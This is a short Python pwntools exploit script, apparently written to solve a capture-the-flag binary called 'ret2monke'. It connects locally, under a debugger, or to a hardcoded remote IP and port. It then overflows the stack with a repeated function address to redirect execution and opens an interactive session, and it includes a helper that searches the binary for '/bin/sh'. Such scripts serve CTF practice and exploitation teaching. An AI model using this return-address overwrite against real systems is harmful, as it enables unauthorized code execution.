#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./ret2monke_patched")

context.binary = exe

REMOTE_NC_CMD    = " nc 165.227.103.166 6001 "    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(p64(exe.sym.monke)*50)
    
    r.interactive()

if __name__ == "__main__":
    main()